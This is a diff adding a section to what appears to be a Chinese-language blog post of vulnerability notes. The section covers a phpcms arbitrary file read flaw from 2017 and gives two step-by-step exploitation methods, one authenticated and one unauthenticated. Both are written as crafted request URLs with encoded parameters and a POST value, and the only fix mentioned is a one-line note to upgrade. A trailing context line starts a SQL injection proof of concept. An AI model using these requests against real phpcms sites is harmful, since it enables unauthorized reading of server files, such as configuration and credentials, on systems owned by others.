@@ -14,6 +14,32 @@ permalink: 01
 <!--more -->
 免责申明：*文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负*
 
+### phpcms 任意文件读取漏洞
+更新于2017年5月4日
+漏洞具体细节参考：http://bobao.360.cn/learning/detail/3805.html
+#### 漏洞利用
+方案一：
+登录普通用户，访问链接：
+```bash
+http://localhost/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&f=p%3%25252%2*70C
+```
+获取分配的att_json,然后将这段json值带入到down类的init函数中去：
+```bash
+http://localhost/index.php?m=content&c=down&a=init&a_k=013ceMuDOmbKROPvvdV0SvY95fzhHTfURBCK4CSbrnbVp0HQOGXTxiHdRp2jM-onG9vE0g5SKVcO_ASqdLoOSsBvN7nFFopz3oZSTo2P7b6N_UB037kehz2lj12lFGtTsPETp-a0mAHXgyjn-tN7cw4nZdk10Mr2g5NM_x215AeqpOF6_mIF7NsXvWiZl35EmQ
+```
+方案二：
+在未登录的情况下访问：
+```bash
+http://localhost/index.php?m=wap&c=index&a=init&siteid=1
+```
+获取当前的siteid,然后再访问:
+```bash
+http://localhost/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&f=p%3%25252%2*70C
+POST_DATA:userid_flash=14e0uml6m504Lbwsd0mKpCe0EocnqxTnbfm4PPLW
+```
+#### 修复方案
+升级至官方最新版本
+
 ### phpcms sql漏洞
 #### Poc
 存在sql注入漏洞的页面：
